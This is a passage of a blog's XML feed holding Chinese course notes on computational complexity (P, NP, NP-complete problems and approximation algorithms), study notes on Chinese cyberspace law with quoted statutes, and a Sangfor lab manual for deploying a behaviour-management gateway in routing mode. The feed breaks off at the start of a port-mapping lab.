(难解问题)</h3><p>在计算机科学领域，若無法在&#x3D;&#x3D;<strong>最差情況</strong>&#x3D;&#x3D;(Worst-case)下，以多项式时 间的算法來解决某个问题，则该问题被称为难解 (Intractable)问题 </p><p>✓ 一个难解的问题，必須<strong>沒有任何多项式时间的算法</strong>可以解它</p><h3 id="Deterministic-Algorithm-决定性算法-确定性算法"><a href="#Deterministic-Algorithm-决定性算法-确定性算法" class="headerlink" title="Deterministic Algorithm (决定性算法&#x2F;确定性算法)"></a>Deterministic Algorithm (决定性算法&#x2F;确定性算法)</h3><p>定义: 这类算法在做任何事时，该算法的下一步只有<strong>一件事</strong>可以做。 (Permitting at most one next move at any step in a computation)  </p><p>✓ 是指算法中<strong>每一个步骤的运算都需要被唯一定义</strong>，因此产生的结果也是 唯一的。 </p><p>✓ 能夠执行决定性算法的机器，称为决定性的机器 (Deterministic  Machine)。电脑就是一种决定性的机器。</p><h3 id="图灵机"><a href="#图灵机" class="headerlink" title="图灵机"></a>图灵机</h3><p><img src="/img/course/image-20240106131421734.png" alt="image-20240106131421734"></p><h2 id="P-、NP及NPC类问题"><a href="#P-、NP及NPC类问题" class="headerlink" title="P 、NP及NPC类问题"></a>P 、NP及NPC类问题</h2><h3 id="P-、NP及NPC定义"><a href="#P-、NP及NPC定义" class="headerlink" title="P 、NP及NPC定义"></a>P 、NP及NPC定义</h3><p>&#x3D;&#x3D;<strong>P类问题</strong>&#x3D;&#x3D;：一类问题的集合，对其中的任一问题，都存在一个确定型图灵 机M和一个多项式p，对于该问题的任何(编码)长度为n的实例，M都能在 p(n)步内，给出对该实例的回答。即：&#x3D;&#x3D;多项式时间内可被解决的问题&#x3D;&#x3D; </p><p>&#x3D;&#x3D;<strong>NP类问题</strong>&#x3D;&#x3D;：一类问题的集合，对其中的任一问题，都存在一个非确定型 图灵机M和一个多项式p，对于该问题的任何(编码) 长度为n的实例，M都 能在p(n)步内，给出对该实例的回答。&#x3D;&#x3D;<strong>多项式时间内可验证问题(指验证其解的正确性)</strong>&#x3D;&#x3D;</p><p>多一归约：假设L1和L2是两个判定问题，f将L1的每个实例I变换成L2的实 例f(I)。若对L1的每个实例I，I的答案为“是”当且仅当f(I)是L2的答案为 “是”的实例，则称f是从L1到L2的多一归约，记作L1 ≤ mL2 (传递关系) 直观意义：将求解L1的问题转换为求解L2的问题，而问题L1不会难于L2 </p><p>&#x3D;&#x3D;多项式时间多一归约&#x3D;&#x3D;：若f是多项式时间可计算，则上述归约称为多项式 时间多一归约，也称多项式时间变换。记作： </p><p>&#x3D;&#x3D;NPC问题&#x3D;&#x3D;：对于一个(判定性)问题q，若 (1) q ∈ NP; (2) NP中任一问题均可 多项式时间多一归约到q，则称问题q为NP-完全的(NP-complete，NPC) </p><p>&#x3D;&#x3D;NP-hard问题&#x3D;&#x3D;：若问题q仅满足条件(2)而不一定满足条件(1)，则问题q称 为NP-难的(NP-hard，NPH)。显然：NPC ⊆ NP-hard</p><h3 id="P、NP、NPC和NP-hard之关系"><a href="#P、NP、NPC和NP-hard之关系" class="headerlink" title="&#x3D;&#x3D;P、NP、NPC和NP-hard之关系&#x3D;&#x3D;"></a>&#x3D;&#x3D;P、NP、NPC和NP-hard之关系&#x3D;&#x3D;</h3><p><img src="/img/course/image-20240106133422515.png" alt="image-20240106133422515"></p><h2 id="NP完全问题的求解"><a href="#NP完全问题的求解" class="headerlink" title="NP完全问题的求解"></a>NP完全问题的求解</h2><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p><strong>减少搜索量</strong>：</p><p>简单算法是穷举搜索，时间为指数 </p><p>减少搜索量：分枝限界法，隐枚举法、动态规划等。可以提高效率， 但时间复杂度不变 </p><p><strong>优化问题</strong> </p><p>降低优化要求，求近似解，以得到一个多项式时间的算法。即：找 寻在容许的时间内得到容许精度的<strong>近似最优解</strong>的算法</p><p><strong>&#x3D;&#x3D;近似算法&#x3D;&#x3D;</strong></p><p>近似算法放弃求最优解，用近似解代替最优解，以换取算法设计 上的简化和时间复杂性的降低。 </p><p>近似算法通常采用两个标准来<strong>衡量性能</strong>： </p><p>✓ 算法的**&#x3D;&#x3D;时间复杂性&#x3D;&#x3D;** </p><p>✓ 解的&#x3D;&#x3D;<strong>近似程度</strong>&#x3D;&#x3D; </p><p>• 近似比 • 相对误差λ • 相对误差界ε(n)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;考试题型及分值&quot;&gt;&lt;a href=&quot;#考试题型及分值&quot; class=&quot;headerlink&quot; title=&quot;考试题型及分值&quot;&gt;&lt;/a&gt;考试题型及分值&lt;/h1&gt;&lt;p&gt;一、选择题（共 9 小题，每小题 2 分，共 18 分）&lt;br&gt;二、判断题（共 5 小题，每小题 2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>网络空间法律法规</title>
    <link href="http://example.com/2024/01/03/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84/"/>
    <id>http://example.com/2024/01/03/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84/</id>
    <published>2024-01-03T10:04:14.000Z</published>
    <updated>2024-01-04T11:21:39.974Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、网络空间安全管理法律法规对于维护我国网络空间安全的重要性"><a href="#1、网络空间安全管理法律法规对于维护我国网络空间安全的重要性" class="headerlink" title="1、网络空间安全管理法律法规对于维护我国网络空间安全的重要性"></a>1、网络空间安全管理法律法规对于维护我国网络空间安全的重要性</h2><p>背景 (目前存在的问题)</p><p>可以对比技术来说管理</p><p>结合某一具体网络安全问题、列举具体法律法规</p><h3 id="回答"><a href="#回答" class="headerlink" title="回答"></a>回答</h3><p>背景：</p><p>网络空间逐步成为世界主要国家展开竞争和战略博弈的新领域。我国作为一个拥有大量网民并正在持续发展中的国家，不断感受到来自现存霸主美国的战略压力。这决定了网络空间成为我国国家利益的新边疆，确立网络空间行为准则和模式已是当务之急。目前，中国已经成为名符其实的网络大国。截至2023年6月，我国网民规模达10.79亿人。但现实的网络环境十分堪忧，网络诈骗层出不穷、网络入侵比比皆是、个人隐私肆意泄露。</p><p>网络空间安全现状</p><p><img src="/img/coursr/image-20240104110205525.png" alt="image-20240104110205525"></p><p><img src="/img/coursr/image-20240104110245672.png" alt="image-20240104110245672"></p><p>&#x3D;&#x3D;<strong>从“无法可寻”到“有法可依”，是依法治网、化解网络 空间风险的法律武器，是网络空间健康运行的重要保障。</strong>&#x3D;&#x3D;</p><p>网络空间安全中三成依靠计算机系统信息安全设备和技术保障，而七成则依靠用户安全管理意识的提高以及管理模式的更新。 </p><p>1.技术是构筑材料，管理是真正的粘合剂和催化剂。</p><p>2.网络空间安全管理构成了网空安全具有能动性的部分，是指导和控制组织的关于信息安全风险的相互协调的活动。 </p><p>3.现实世界里大多数安全事件的发生和安全隐患的存在，与其说是技术上的原因，不如说是管理不善造成的。</p><p>4.理解并重视管理对于网络空间安全的关键作用，对于真正实现网空安全目标尤其重要</p><p>2022年7月21日，在依法对滴滴公司涉嫌违法的行为进行立案调查 后，国家互联网信息办公室依据《网络安全法》《数据安全法》 《个人信息保护法》等法律法规公布了对该公司的处罚决定—— 罚款80.26亿元，对滴滴全球股份有限公司董事长兼 CEO 程维、总 裁柳青各处人民币 100 万元罚款。</p><h2 id="2、我国关键信息基础设施保护制度"><a href="#2、我国关键信息基础设施保护制度" class="headerlink" title="2、我国关键信息基础设施保护制度"></a>2、我国关键信息基础设施保护制度</h2><p>定义、重要性</p><p>关基运营者义务等</p><p>法条举例说明<br>《网络安全法》<br>《关键信息基础设施安全保护条例》…</p><h3 id="回答-1"><a href="#回答-1" class="headerlink" title="回答"></a>回答</h3><h4 id="定义，重要性："><a href="#定义，重要性：" class="headerlink" title="定义，重要性："></a>定义，重要性：</h4><p><strong>定义</strong>：本条例所称关键信息基础设施，是指公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务、国防科技工业等重要行业和领域的，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的重要网络设施、信息系统等</p><p>政务、公共通信、金融、能源、交通等重要领域的系统、设备越来越多地 采用联网的方式运行或提供服务。这些系统承载着大量的国家基础数据、重要政务数据、公民个人信息， 是网络空间安全的命脉所在。因此，&#x3D;&#x3D;<strong>我国在网络 安全等级保护制度基础上对关键信息基础设施实行重点保护,专门建立关键信息基础设施运行安全制度</strong>&#x3D;&#x3D;。</p><h4 id="关基运营者义务等"><a href="#关基运营者义务等" class="headerlink" title="关基运营者义务等"></a>关基运营者义务等</h4><p>《网络安全等级保护条例(征求意见稿)》第四条规定:网络运营者在网络建设过程中，应当 同步规划、同步建设、同步运行网络安全保护、保密和密码保护措施。涉密网络应当依据 国家保密规定和标准，结合系统实际进行保密防护和保密监管</p><p>《关键信息基础设施安全保护条例》第十二条　安全保护措施应当与关键信息基础设施同 步规划、同步建设、同步使用。</p><p>《电信条例》第六十条规定:电信业务经营者 在电信网络的设计、建设和运行中，应当做到与国家安全和电信网络安全的需求&#x3D;&#x3D;同步规划， 同步建设,同步运行&#x3D;&#x3D;。</p><h4 id="监管者义务（国家部门）说一个就行"><a href="#监管者义务（国家部门）说一个就行" class="headerlink" title="监管者义务（国家部门）说一个就行"></a>监管者义务（国家部门）说一个就行</h4><p>网络安全法第三十九条规定:“国家网信部门应当统 筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p><p>• (一)对关键信息基础设施的安全风险进行抽查检测,提出改进措施，必要时可以委托网络安全服务机构 对网络存在的安全风险进行检测评估; </p><p>• (二)定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协 同配合能力; </p><p>• (三)促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络 安全信息共享; </p><p>• (四)对网络安全事件的应急处置与网络功能的恢复等,提供技术支持和协助。</p><p>《关键信息基础设施安全保护条例》针对关键信息基础设施安全保护的统筹协作机制，列举 如下: </p><p>• 第三条 在<strong>国家网信部门</strong>统筹协调下，国务院公安部门负责指导监督关键信息基础设施安 全保护工作。国务院电信主管部门和其他有关部门依照本条例和有关法律、行政法规的规 定，在各自职责范围内负责关键信息基础设施安全保护和监督管理工作。</p><p> • 第二十三条 国家网信部门统筹协调有关部门建立网络安全信息共享机制，及时汇总、研 判、共享、发布网络安全威胁、漏洞、事件等信息，促进有关部门、保护工作部门、运营 者以及网络安全服务机构等之间的网络安全信息共享。</p><p><img src="/img/coursr/image-20240102195631273.png" alt="image-20240102195631273"></p><p>法条举例说明<br>《网络安全法》<br>&#x3D;&#x3D;《关键信息基础设施安全保护条例》&#x3D;&#x3D; </p><h2 id="3、我国个人信息保护制度"><a href="#3、我国个人信息保护制度" class="headerlink" title="3、我国个人信息保护制度"></a>3、我国个人信息保护制度</h2><p>背景、</p><p>定义 (个人信息、敏感个人信息)</p><p>个人信息处理相关制度</p><p>法条举例说明<br>《网络安全法》<br>《个人信息保护法》···</p><h3 id="回答-2"><a href="#回答-2" class="headerlink" title="回答"></a>回答</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>个人信息被誉为二十一世纪最有价值的资源。推动个人信息的合理、合法收集和使用,保障个人和企业之间 形成良好的互动关系，对于形成数字经济健康发展的制度环境至关重要。同时，大数据技术及相关产业的 发展，正前所未有地改变着个人信息的收集和使用方式,对现有的个人信息保护制度带来新的问题和挑战。 如何有效平衡个人信息的利用与保护，是各国经济发展所面临的共同问题。</p><h4 id="定义-个人信息、敏感个人信息"><a href="#定义-个人信息、敏感个人信息" class="headerlink" title="定义 (个人信息、敏感个人信息)"></a>定义 (个人信息、敏感个人信息)</h4><p><strong>个人信息</strong>是以电子或者其他方式记录的与已识别或者可识别的自然人有关的各种 信息，不包括匿名化处理后的信息。 • 个人信息的处理包括个人信息的收集、存储、使用、加工、传输、提供、公开、删除等。</p><p><strong>个人敏感信息</strong> ：一旦泄露、非法提供或滥用可能危害人身和财产安全，极易导致个人名誉、身心健 康受到损害或歧视性待遇等的个人信息。 注 1：个人敏感信息包括身份证件号码、个人生物识别信息、银行账户、通信记录和内容、财产信息、 征信信息、行踪轨迹、住宿信息、健康生理信息、交易信息、14 岁以下（含）儿童的个人信息 等。</p><h4 id="个人信息处理相关制度"><a href="#个人信息处理相关制度" class="headerlink" title="个人信息处理相关制度"></a>个人信息处理相关制度</h4><p><strong>网络安全法</strong> 第四十一条 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。 网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双 方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息</p><p><strong>个人信息保护法</strong> 第四条　个人信息是以电子或者其他方式记录的与已识别或者可识别的自然 人有关的各种信息，不包括匿名化处理后的信息。 </p><p>个人信息的处理包括个人信息的收集、存储、使用、加工、传输、提供、公开、删除等。</p><p>确立个人信息处理应遵循的原则，强调处理个人信息应当遵循合法、正当、必要和诚信原 则，具有明确、合理的目的，限于实现处理目的的最小范围，公开处理规则，保证信息准 确，采取安全保护措施等，并将上述原则贯穿于个人信息处理的全过程、各环节。(第五条 至第九条)</p><h2 id="4、我国数据出境制度"><a href="#4、我国数据出境制度" class="headerlink" title="4、我国数据出境制度"></a>4、我国数据出境制度</h2><p>背景</p><p>定义、重要性</p><p>各主体义务</p><p>法条举例说明<br>《中华人民共和国网络安全法》<br>《中华人民共和国数据安全法》<br>《中华人民共和国个人信息保护法》<br>《数据出境安全评估办法》</p><h3 id="回答-3"><a href="#回答-3" class="headerlink" title="回答"></a>回答</h3><h4 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h4><p>近年来，随着数字经济的蓬勃发展，数据跨境活动日益频繁，数据处理者的数据出境需求快速增长。明确数据出境安全评估的具体规定，是促进数字经济健康发展、防范化解数据跨境安全风险的需要，是维护国家安全和社会公共利益的需要，是保护个人信息权益的需要。</p><h4 id="定义、重要性"><a href="#定义、重要性" class="headerlink" title="定义、重要性"></a>定义、重要性</h4><p><strong>数据</strong>，是指任何以电子或者其他方式对信息的记录。</p><p><strong>重要数据</strong> critical data 以电子方式存在的，一旦遭到篡改、破坏、泄露或者非法获取、非法利用，可能危害国家安全、公共利益的数据。</p><h4 id="各主体义务"><a href="#各主体义务" class="headerlink" title="各主体义务"></a>各主体义务</h4><p><strong>网络安全法</strong> </p><p>第三十七条是关于数据出境管理制度的规定:“关键信息基础设施的运营者在中 华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要, 确需向境外提供的,应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估;法 律、行政法规另有规定的，依照其规定。</p><p><strong>数据安全法</strong>• 第三十一条 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的重要数据的出境 安全管理，适用《中华人民共和国网络安全法》的规定；其他数据处理者在中华人民共和国境内运营 中收集和产生的重要数据的出境安全管理办法，由国家网信部门会同国务院有关部门制定。 </p><p>• 第三十六条　中华人民共和国主管机关根据有关法律和中华人民共和国缔结或者参加的国际条约、协 定，或者按照平等互惠原则，处理外国司法或者执法机构关于提供数据的请求。非经中华人民共和国 主管机关批准，境内的组织、个人不得向外国司法或者执法机构提供存储于中华人民共和国境内的数 据。 </p><p>• 第四十六条　违反本法第三十一条规定，向境外提供重要数据的，由有关主管部门责令改正，给予警 告，可以并处十万元以上一百万元以下罚款，对直接负责的主管人员和其他直接责任人员可以处一万 元以上十万元以下罚款；情节严重的，处一百万元以上一千万元以下罚款，并可以责令暂停相关业务、 停业整顿、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处十 万元以上一百万元以下罚款。 数据出境管理制度 数据安全法</p><p>《<strong>个人信息保护法</strong>》第三章 第三十九条 个人信息处理者向中华人民共和国境外提供个人信息的，应当向个人 告知境外接收方的名称或者姓名、联系方式、处理目的、处理方式、个人信息的种 类以及个人向境外接收方行使本法规定权利的方式和程序等事项，并取得个人的单 独同意。 • 第四十条 关键信息基础设施运营者和处理个人信息达到国家网信部门规定数量的 个人信息处理者，应当将在中华人民共和国境内收集和产生的个人信息存储在境内。 确需向境外提供的，应当通过国家网信部门组织的安全评估；法律、行政法规和国 家网信部门规定可以不进行安全评估的，从其规定</p><h4 id="法条举例说明"><a href="#法条举例说明" class="headerlink" title="法条举例说明"></a>法条举例说明</h4><p>网络安全法第三章网络运行安全第二节关键信息基础设施的运行安全中的第 三十七条规定:“关键信息基础设施的运营者在中华人民共和国境内运营中 收集和产生的个人信息和重要数据应当在境内存储。因业务需要,确需向境 外提供的,应当按照国家网信部门会同国务院有关部门制定的办法进行安全 评估;法律、行政法规另有规定的,依照其规定。”</p><p>《中华人民共和国数据安全法》 • 第三条　本法所称数据，是指任何以电子或者其他方式对信息的记录。 　数据处理，包括数据的收集、存储、使用、加工、传输、提供、公开等。 　数据安全，是指通过采取必要措施，确保数据处于有效保护和合法利用的状态，以及具备保障 持续安全状态的能力。</p><p>第二条　在中华人民共和国境内开展数据处理活动及其安全监管，适用本法。 　在中华人民共和国境外开展数据处理活动，损害中华人民共和国国家安全、公共利 益或者公民、组织合法权益的，依法追究法律责任。 • 第十一条　国家积极开展数据安全治理、数据开发利用等领域的国际交流与合作，参与数 据安全相关国际规则和标准的制定，促进数据跨境安全、自由流动。 • 第二十五条　国家对与维护国家安全和利益、履行国际义务相关的属于管制物项的数据依 法实施出口管制。</p><h2 id="5、违法信息监管制度"><a href="#5、违法信息监管制度" class="headerlink" title="5、违法信息监管制度"></a>5、违法信息监管制度</h2><p>背景</p><p>定义</p><p>网络使用者义务、网络运营者义务等</p><p>法条举例说明<br>《中华人民共和国网络安全法》<br>《中华人民共和国数据安全法》<br>《中华人民共和国个人信息保护法》<br>《数据出境安全评估办法》</p><h3 id="回答-4"><a href="#回答-4" class="headerlink" title="回答"></a>回答</h3><h4 id="背景-2"><a href="#背景-2" class="headerlink" title="背景"></a>背景</h4><p>违法信息监管的立法现状 • 随着互联网的深度普及和人工智能、大数据等技术在网络信息服务领域的广泛应用,当前的网络 信息服务业务呈现出智能化、个性化和强交互的态势。网络信息发布主体的多样性、网络信息 内容的动态性、网络文化体系的开放性使得网络信息呈现出多元、多变、多样的特点。网络信 息传播速度之快、传播领域之广也体现出万物互联的特色。这也为违法信息的滋生和蔓延提供 了沃土。网络安全法的出台,对违法信息监管制度的完善提出了更高的要求,促进了网络信息服务 相关领域法律体系的完善。 </p><p>• 网络信息内容管理方面，在《互联网信息服务管理办法》统率下，国家网信办依次发布《互联 网信息搜索服务管理规定》《移动互联网应用程序服务管理规定》《互联网直播服务管理规定》 《互联网新闻信息服务管理规定》《互联网论坛社区服务管理规定》《互联网跟帖评论服务管 理规定》《互联网群组信息服务管理规定》《互联网用户公众账号信息服务管理规定》《微博 客信息服务管理规定》。互联网信息内容管理体系日臻完善。</p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p><strong>违法信息监管的规范性表述</strong> • 网络安全法出台之前，我国网络信息安全管理的法律法规体系尚不健全。在不同法律法规中对违 法信息类型及其规制有零散规定。 • 《全国人大常委会关于维护互联网安全的决定》中的相关规定如下: • “二、为了维护国家安全和社会稳定,对有下列行为之一,构成犯罪的,依照刑法有关规定追究刑事 责任: • (一)利用互联网造谣、诽谤或者发表、传播其他有害信息，煽动颠覆国家政权、推翻社会主义制 度,或者煽动分裂国家、破坏国家统一; • (二)通过互联网窃取、泄露国家秘密、情报或者军事秘密； • (三)利用互联网煽动民族仇恨、民族歧视，破坏民族团结; • (四)利用互联网组织邪教组织、联络邪教组织成员，破坏国家法律、行政法规实施。</p><h4 id="网络使用者的一般义务、网络运营者义务等"><a href="#网络使用者的一般义务、网络运营者义务等" class="headerlink" title="网络使用者的一般义务、网络运营者义务等"></a>网络使用者的一般义务、网络运营者义务等</h4><p><strong>网络使用者的一般义务</strong>：1、网络安全法和刑法相关规定 • 关于禁止利用网络从事违法犯罪活动，网络安全法第四十六条规定:“任何个人和组织应当 对其使用网络的行为负责,不得设立用于实施诈骗,传授犯罪方法，制作或者销售违禁物品、 管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗,制作或者销 售违禁物品、管制物品以及其他违法犯罪活动的信息。” • 关于电子信息发送者和应用软件提供者的网络信息安全义务,网络安全法第四十八条第一款 规定:“任何个人和组织发送的电子信息、提供的应用软件,不得设置恶意程序,不得含有法律、 行政法规禁止发布或者传输的信息。</p><p>网络安全法第四章网络信息安全包含第四十条至第五十条,其中第四十条至第四十五条是关 于个人信息保护制度的规定,第四十六条至第五十条是关于违法信息监管制度的规定。本章 讨论违法信息监管制度，具体包括违法信息监管制度概述、网络使用者的一般义务、网络 运营者处置违法信息的义务、网络运营者建立投诉举报制度、网络运营者配合监督检查的 义务、国家对违法信息的监督管理等</p><p>1、相关规定 • 关于<strong>网络运营者</strong>、电子信息发送服务提供者、应用软件下载服务提供者处置违法信息的义务， 网络安全法第四十七条和第四十八条第二款都有规定。 • 第四十七条规定:“网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止 发布或者传输的信息的,应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存 有关记录，并向有关主管部门报告。” • 第四十八条规定:“任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不 得含有法律、行政法规禁止发布或者传输的信息。 • 电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有 前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录,并向有关主管部门 报告。</p><h2 id="等级保护制度"><a href="#等级保护制度" class="headerlink" title="等级保护制度"></a>等级保护制度</h2><p>PPT 5-10</p><h2 id="网络运行安全"><a href="#网络运行安全" class="headerlink" title="网络运行安全"></a>网络运行安全</h2><p>PPT 5-10</p><p>监测预警，应急处置：</p><p>例如：预警分几级</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、网络空间安全管理法律法规对于维护我国网络空间安全的重要性&quot;&gt;&lt;a href=&quot;#1、网络空间安全管理法律法规对于维护我国网络空间安全的重要性&quot; class=&quot;headerlink&quot; title=&quot;1、网络空间安全管理法律法规对于维护我国网络空间安全的重要性&quot;&gt;</summary>
      
    
    
    
    
    <category term="信息安全课程" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>AC的路由模式部署</title>
    <link href="http://example.com/2023/12/29/AC01/"/>
    <id>http://example.com/2023/12/29/AC01/</id>
    <published>2023-12-29T08:02:00.000Z</published>
    <updated>2023-12-29T08:03:13.014Z</updated>
    
    <content type="html"><![CDATA[<p>【全网行为管理】01-AC的路由模式部署</p><p>装备实验</p><p>开始实验01:00:00</p><p><img src="https://oss.edu.sangfor.com.cn/file/20230803/%E6%A0%A1%E4%BC%81%E5%B0%8F%E6%9C%8D-%E5%BC%80%E5%BF%83%E5%A4%B4%E5%83%8F2x2308031952420255fsmq.png" alt="img"></p><p>拓扑</p><p>实验手册</p><p>实验报告</p><p>声明：本实验手册仅供学习交流使用，请勿用于非法用途，违者一律自行承担所有风险！PS：本窗口支持左右拉伸</p><h1 id="AC的路由模式部署"><a href="#AC的路由模式部署" class="headerlink" title="AC的路由模式部署"></a>AC的路由模式部署</h1><h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><p>理解深信服上网行为管理设备（下面简称AC），作为公司网关部署的过程与原理</p><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>AC作为网关部署在公司互联网出口，其原理与传统路由器一致。主要作用完成用户的SNAT上网工作，以及从外向内访问服务器的DNAT工作。本实验，我们主要讲述SNAT的部署过程。</p><h2 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h2><p>某大型集团公司，其集团总部为了管理公司内部PC上网，计划使用AC来代替传统路由器，解决用户上网认证、网速管理、日志审计等问题。本实验是部署AC的第一步场景。</p><h2 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h2><p><img src="https://oss.edu.sangfor.com.cn/file/20220418/AC%E5%AE%9E%E9%AA%8C1%E9%83%A8%E7%BD%B2220418170816453o4av5.png" alt="AC实验1部署.png"></p><h2 id="实验设备"><a href="#实验设备" class="headerlink" title="实验设备"></a>实验设备</h2><p>1、总部AC ，作总部出口网关使用<br>2、微软域控，作为总部的服务器，本实验中主要作用为WEB服务器,理解为集团公司网站。<br>3、PC1，普通办公PC，员工办公使用，需要连接互联网<br>4、Internet-WEB Server，互联网上的WEB服务器，理解为类似sina，baidu等站点。</p><h2 id="环境预配"><a href="#环境预配" class="headerlink" title="环境预配"></a>环境预配</h2><p>环境预配，是指已经实验场景化的配置边界。<br>实验环境中，<strong>非深信服设备，不需要学员配置。</strong>如交换机、路由器、PC、服务器。</p><p>实验环境中，<strong>深信服设备，需要学员按实验拓扑说明进行配置。</strong></p><p>实验环境中，配置基本遵循上述两条原则，<strong>少数实验例外</strong>。例外过程，在实验步骤中说明</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>一、配置总部AC的网络（操作对象：总部AC）</p><p>登录设备过程略</p><p>1.1 开始配置网络</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220126/image220126162610618wmhra.png" alt="image.png"></p><p>1.2 选择路由模式</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220126/image22012616274665461ibb.png" alt="image.png"></p><p>1.3 根据拓扑图，配置网卡，如下图</p><p>其中<br>eth1为LAN口，即办公区<br>eth2为DMZ口，即服务器区<br>eth3为WAN口，即互联网区</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image2201271300504664knzs.png" alt="image.png"></p><p>1.4 配置eth1</p><p>eth1接办公区，IP地址参照拓扑图配置</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image220127131616695za1gy.png" alt="image.png"></p><p>1.5 配置eth3</p><p>eth3接互联网区，IP地址参照拓扑图配置</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220126/image2201261721328713hwx0.png" alt="image.png"></p><p>1.6 配置eth2</p><p>eth2接DMZ区，即服务器区，IP地址参照拓扑图配置</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220126/image220126171325751k1dw5.png" alt="image.png"></p><p>1.7 配置代理上网</p><p>这里配置代理办公网段上网。办公网网段为192.168.1.0&#x2F;24</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220126/image2201261717284730snac.png" alt="image.png"></p><p>1.8 检查无误后提交</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image220127131823425ugehh.png" alt="image.png"></p><p>二、检查PC1上网是否正常（操作对象：PC1）</p><p>打开PC1 桌面上的浏览器，访问Internet-WEB,即124.126.200.2</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image2201271323141379lfx0.png" alt="image.png"></p><p>访问正常</p><p>三、查看微软域控能否访问互联网（操作对象：微软域控）</p><p>打开桌面上浏览器，访问Internet-WEB,即124.126.200.2</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image22012713251368961evi.png" alt="image.png"></p><p>发现无法访问，因为在AC中仅做了办公网段的代理上网，而没有做服务器网段代理上网。</p><p>四、查看PC1能否访问域控制器上的WEB页面（操作对象：PC1）</p><p>打开PC1 桌面上的浏览器，访问微软域控的WEB,即172.16.0.100</p><p><img src="https://oss.edu.sangfor.com.cn/file/20220127/image22012713302885578qp5.png" alt="image.png"></p><p>可以访问。因为PC1与微软域控，同在内网，路由直接可达。</p><h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>通过本实验，理解AC的网关部署原理，和传统路由器作网关原理一致。AC所谓的“代理上网”理解为SNAT，即源地址转换。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;【全网行为管理】01-AC的路由模式部署&lt;/p&gt;
&lt;p&gt;装备实验&lt;/p&gt;
&lt;p&gt;开始实验01:00:00&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss.edu.sangfor.com.cn/file/20230803/%E6%A0%A1%E4%BC%81%E5%</summary>
      
    
    
    
    
    <category term="深信服" scheme="http://example.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
  </entry>
  
  <entry>
    <title>AC的端口映射</title>
    <link href="http://example.com/2023/12/29/AC02/"/>
    <id>http://example.com/2023/12/29/AC02/</id>
    <published>2023-12-29T08:02:00.000Z</published>
    <updated>2023-12-29T08:03:18.953Z</updated>
    
    <content type="html"><![CDATA[<p>【全网行为管理】02-AC的端口映射</p><p>装备实验</p><p>开始实验01:00:00</p><p><img src="https://oss.edu.sangfor.com.cn/file/20230803/%E6%A0%A1%E4%BC%81%E5%B0%8F%E6%9C%8D-%E5%BC%80%E5%BF%83%E5%A4%B4%E5%83%8F2x2308031952420255fsmq.png" alt="img"></p><p>拓扑</p><p>实验手册</p><p>实验报告</p><p>声明：本实验手册仅供学习交流使用，请勿用于非法用途，违者一律自行承担所有风险！PS：本窗口支持左右拉伸</p><h1 id="AC的端口映射"><a href="#AC的端口映射" class="headerlink" title="AC的端口映射"></a>AC的端口映射</h1><h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><p>学会配置AC的端口映射（DNAT）功能，满足从外网访问企业内部网站的需求。</p><h2 id="实验原理"><a href="#实验原理" class="headerlink" 